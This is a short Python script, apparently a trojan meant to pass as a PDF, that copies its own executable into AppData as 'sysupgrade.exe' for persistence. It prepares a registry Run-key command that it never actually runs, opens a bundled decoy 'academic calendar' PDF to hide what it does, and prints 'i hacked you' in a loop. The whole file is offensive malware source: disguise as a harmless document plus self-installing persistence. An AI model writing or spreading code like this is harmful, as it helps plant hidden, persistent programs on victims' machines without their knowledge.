import time
import subprocess
import os
import shutil
import sys

def add_to_registry():
    #persistence
    new_file = os.environ["appdata"] + "\\sysupgrade.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable,new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file

add_to_registry()

def open_added_file():
    added_file = sys._MEIPASS + "\\akademik_takvim.pdf"
    subprocess.Popen(added_file,shell=True)

open_added_file()

i = 0

while i < 100:
    print("i hacked you")
    i += 1
    time.sleep(0.17)

#my_check = subprocess.check_output("commmand",shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)